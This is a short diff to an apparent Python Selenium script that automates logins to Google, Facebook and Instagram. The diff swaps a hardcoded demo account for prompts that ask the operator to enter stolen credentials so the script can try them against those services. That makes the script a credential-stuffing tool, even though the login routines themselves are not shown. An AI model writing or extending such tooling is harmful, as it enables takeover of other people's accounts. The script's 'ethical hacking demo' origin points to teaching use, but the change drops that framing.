@@ -3,6 +3,7 @@ from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.by import By
+import sys
 
 def run_all_login_attempts (username, password):
 	driver = webdriver.Firefox()
@@ -88,4 +89,9 @@ def try_instagram(username, password, driver):
 
 if __name__ == "__main__":
 
-	run_all_login_attempts("ethicalhackingdemo@gmail.com", "TEst123!")
+	print("Input stolen credentials to try them against Google, Facebook, and Instagram")
+
+	username = input("Input received email: ")
+	password = input("Input received password: ")
+
+	run_all_login_attempts(username, password)
